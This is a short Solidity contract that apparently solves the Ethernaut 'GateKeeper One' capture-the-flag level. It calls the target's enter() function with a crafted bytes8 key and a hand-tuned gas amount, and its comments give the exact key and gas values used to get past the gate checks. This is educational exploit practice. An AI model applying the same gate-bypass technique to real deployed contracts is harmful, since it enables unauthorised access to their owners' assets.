// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

interface GateKeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

/**
 * @title FenceClimberOne
 * @dev Bypass all gatekeeper one checks
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract FenceClimberOne {
    function climb(address _contract, bytes8 _value, uint _gas) public returns (bool) {
        bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"), _value); // Value = 0x0000000100008d44 (last two bytes of player adress + 1 at 2**32 for second gate check)
        (bool success, ) = _contract.call{gas: _gas}(encodedParams); // Gas = 33018 has to find it manually by looking at how much gas is left when contract makes comparison
        return success;
    }
}